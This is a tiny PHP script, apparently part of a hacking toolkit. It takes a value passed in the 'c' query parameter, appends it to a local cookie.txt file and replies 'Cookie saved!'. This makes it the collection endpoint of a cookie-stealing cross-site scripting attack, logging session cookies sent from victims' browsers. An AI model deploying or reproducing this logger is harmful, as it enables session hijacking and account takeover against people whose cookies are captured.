<?php
$myFile = "modules/htools/ajax/cookie.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_GET['c']."\n\n";
fwrite($fh, $stringData);
fclose($fh);
echo "Cookie saved!";
?>